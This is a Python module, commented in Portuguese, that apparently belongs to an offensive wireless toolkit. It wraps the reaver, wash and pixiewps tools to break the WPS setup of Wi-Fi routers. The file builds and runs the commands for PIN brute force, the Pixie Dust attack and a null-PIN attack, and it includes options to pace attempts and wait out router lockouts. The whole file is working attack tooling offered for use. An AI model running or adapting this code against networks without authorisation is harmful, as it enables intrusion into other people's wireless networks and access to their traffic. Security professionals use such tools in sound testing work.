#!/usr/bin/env python3
# Author: André Henrique (@mrhenrique) | União Geek — https://github.com/Uniao-Geek
"""Bridge subprocess para Reaver + Wash + Pixiewps (WPS).

Invoca ``reaver``, ``wash`` e ``pixiewps`` como processos externos; nenhum código
GPL é importado ou ligado ao interpretador.

Ferramentas expostas por ``mode``:
  - **reaver** — força bruta de PIN WPS e ataque Pixie Dust (-K).
  - **wash** — descoberta de APs com WPS ativo.
  - **pixiewps** — recuperação offline de PIN a partir de parâmetros WPS capturados.

Licenças (apenas subprocess): Reaver GPL-2.0, Pixiewps GPL-3.0.

Version: 1.0.0
"""

from __future__ import annotations

import logging, os, shutil, subprocess
from typing import List, Optional

from wirelessxpl.core.exploit import *

logger = logging.getLogger(__name__)


class Exploit(Exploit):
    """Subprocess bridge para reaver, wash e pixiewps no WirelessXPL-Forge."""

    __info__ = {
        "name": "Reaver / Wash / Pixiewps Bridge",
        "description": (
            "WPS: brute force de PIN e Pixie Dust via reaver (GPL-2.0), varredura WPS "
            "via wash, recuperação offline via pixiewps (GPL-3.0). Somente subprocess."
        ),
        "authors": (
            "André Henrique (@mrhenrike) | União Geek",
            "reaver / pixiewps contributors (GPL, invoked as subprocess)",
        ),
        "references": (
            "https://github.com/t6x/reaver-wps-fork-t6x",
            "https://github.com/wiire/pixiewps",
        ),
        "devices": ("wifi", "802.11 WPS"),
    }

    mode = OptString(
        "reaver",
        "Ferramenta: reaver | wash | pixiewps",
    )
    interface = OptString("", "Interface em modo monitor (reaver/wash)")
    target_bssid = OptString("", "BSSID do AP alvo (reaver; wash opcional com -b)")
    channel = OptString("", "Canal do AP (ex.: 6)")
    pixie_dust = OptBool(False, "Reaver: ataque Pixie Dust (-K)")
    pin = OptString("", "Reaver: PIN fixo para tentar (-p); use '00000000' para null-PIN attack")
    null_pin = OptBool(False, "Reaver: null-PIN attack (tenta PIN 00000000, eficaz em ZTE e outros)")
    delay = OptFloat(0.0, "Reaver: atraso entre tentativas de PIN, segundos (-d); 0 = omitir")
    lock_delay = OptFloat(0.0, "Reaver: espera após detecção de lock, segundos (-l); 0 = omitir")
    max_attempts = OptInteger(0, "Reaver: máximo de tentativas de PIN (-g); 0 = omitir")
    dh_small = OptBool(False, "Reaver: usar chaves DH pequenas (-S)")
    no_nacks = OptBool(False, "Reaver: ignorar NACKs fora de ordem (-N)")
    win7_compat = OptBool(False, "Reaver: compatibilidade Windows 7 / registrar (-W)")
    timeout = OptFloat(0.0, "Reaver: timeout de recepção M5/M7, segundos (-T); 0 = omitir")
    verbose = OptInteger(0, "Reaver: nível de verbosidade (cada unidade adiciona um -v)")
    wash_scan = OptBool(
        True,
        "Wash: varredura com hop de canal (-C); False = apenas canal fixo (-c) se definido",
    )
    wash_json = OptBool(False, "Wash: saída JSON estendida (-j), se suportado pelo binário")
    pixiewps_pke = OptString("", "Pixiewps: PKE (hex)", advanced=True)
    pixiewps_pkr = OptString("", "Pixiewps: PKR (hex)", advanced=True)
    ehash1 = OptString("", "Pixiewps: E-Hash1 (hex)", advanced=True)
    ehash2 = OptString("", "Pixiewps: E-Hash2 (hex)", advanced=True)
    authkey = OptString("", "Pixiewps: AuthKey (hex, opcional)", advanced=True)
    enonce = OptString("", "Pixiewps: E-S1 / enrollee nonce (hex, mapeado para -s)", advanced=True)
    dry_run = OptBool(False, "Exibir comando sem executar")

    _VALID_MODES = frozenset({"reaver", "wash", "pixiewps"})

    def _which(self, name: str) -> Optional[str]:
        """Resolve o caminho absoluto de um executável em PATH."""
        return shutil.which(name)

    def _append_verbose(self, cmd: List[str], count: int) -> None:
        """Anexa ``-v`` ao comando ``count`` vezes (limitado)."""
        n = max(0, min(int(count), 8))
        for _ in range(n):
            cmd.append("-v")

    def _build_reaver_cmd(self, reaver_bin: str) -> List[str]:
        """Monta a linha de comando do reaver."""
        cmd: List[str] = [reaver_bin, "-i", str(self.interface).strip()]
        bssid = str(self.target_bssid).strip()
        if bssid:
            cmd.extend(["-b", bssid])
        ch = str(self.channel).strip()
        if ch:
            cmd.extend(["-c", ch])
        if self.pixie_dust:
            cmd.append("-K")
        if self.null_pin:
            cmd.extend(["-p", "00000000"])
        else:
            pin = str(self.pin).strip()
            if pin:
                cmd.extend(["-p", pin])
        if float(self.delay) > 0:
            cmd.extend(["-d", str(float(self.delay))])
        if float(self.lock_delay) > 0:
            cmd.extend(["-l", str(float(self.lock_delay))])
        if int(self.max_attempts) > 0:
            cmd.extend(["-g", str(int(self.max_attempts))])
        if self.dh_small:
            cmd.append("-S")
        if self.no_nacks:
            cmd.append("-N")
        if self.win7_compat:
            cmd.append("-W")
        if float(self.timeout) > 0:
            cmd.extend(["-T", str(float(self.timeout))])
        self._append_verbose(cmd, int(self.verbose))
        return cmd

    def _build_wash_cmd(self, wash_bin: str) -> List[str]:
        """Monta a linha de comando do wash."""
        cmd: List[str] = [wash_bin, "-i", str(self.interface).strip()]
        bssid = str(self.target_bssid).strip()
        if bssid:
            cmd.extend(["-b", bssid])
        if self.wash_scan:
            cmd.append("-C")
        else:
            ch = str(self.channel).strip()
            if ch:
                cmd.extend(["-c", ch])
        if self.wash_json:
            cmd.append("-j")
        return cmd

    def _build_pixiewps_cmd(self, pixie_bin: str) -> List[str]:
        """Monta a linha de comando do pixiewps."""
        cmd: List[str] = [pixie_bin]

        def _add(flag: str, value: str) -> None:
            v = value.strip()
            if v:
                cmd.extend([flag, v])

        _add("-e", str(self.ehash1))
        _add("-r", str(self.ehash2))
        _add("-k", str(self.pixiewps_pke))
        _add("-p", str(self.pixiewps_pkr))
        _add("-s", str(self.enonce))
        _add("-a", str(self.authkey))
        return cmd

    def run(self) -> None:
        """Executa reaver, wash ou pixiewps conforme ``mode``."""
        mode = str(self.mode).strip().lower()
        if mode not in self._VALID_MODES:
            print_error("mode deve ser reaver, wash ou pixiewps (recebido: {}).".format(mode))
            return

        if mode in ("reaver", "wash"):
            if not str(self.interface).strip():
                print_error("Defina interface (modo monitor) para {}.".format(mode))
                return

        if mode == "reaver":
            exe = self._which("reaver")
            if not exe:
                print_error("reaver não encontrado no PATH. Instale reaver-wps-fork ou pacote equivalente.")
                return
            if not str(self.target_bssid).strip():
                print_error("Defina target_bssid para reaver.")
                return
            try:
                cmd = self._build_reaver_cmd(exe)
            except Exception as exc:
                print_error(str(exc))
                return
        elif mode == "wash":
            exe = self._which("wash")
            if not exe:
                print_error("wash não encontrado no PATH.")
                return
            if not self.wash_scan and not str(self.channel).strip():
                print_info("wash_scan=False sem channel: wash pode precisar de -c explícito.")
            try:
                cmd = self._build_wash_cmd(exe)
            except Exception as exc:
                print_error(str(exc))
                return
        else:
            exe = self._which("pixiewps")
            if not exe:
                print_error("pixiewps não encontrado no PATH.")
                return
            try:
                cmd = self._build_pixiewps_cmd(exe)
            except Exception as exc:
                print_error(str(exc))
                return
            if len(cmd) <= 1:
                print_error(
                    "Pixiewps: informe ao menos alguns de ehash1, ehash2, pixiewps_pke, "
                    "pixiewps_pkr, enonce ou authkey."
                )
                return

        cmd_str = " ".join(cmd)
        if self.dry_run:
            print_info("DRY RUN — comando:")
            print_status(cmd_str)
            return

        print_status("Executando: {}".format(mode))
        print_info(cmd_str)

        try:
            if mode == "pixiewps":
                proc = subprocess.run(
                    cmd,
                    capture_output=True,
                    text=True,
                    timeout=600,
                    cwd=os.getcwd(),
                    check=False,
                )
                if proc.stdout:
                    print_info(proc.stdout.strip())
                if proc.stderr:
                    print_status(proc.stderr.strip())
                if proc.returncode == 0:
                    print_success("pixiewps concluiu (código 0).")
                else:
                    print_error("pixiewps saiu com código {}".format(proc.returncode))
            else:
                result = subprocess.run(cmd, timeout=None, check=False)
                if result.returncode == 0:
                    print_success("{} concluiu com código 0.".format(mode))
                else:
                    print_error("{} saiu com código {}".format(mode, result.returncode))
        except KeyboardInterrupt:
            print_info("\nInterrompido pelo usuário.")
        except subprocess.TimeoutExpired:
            print_error("pixiewps excedeu o tempo máximo (600s).")
        except Exception as exc:
            print_error("Falha ao executar {}: {}".format(mode, exc))
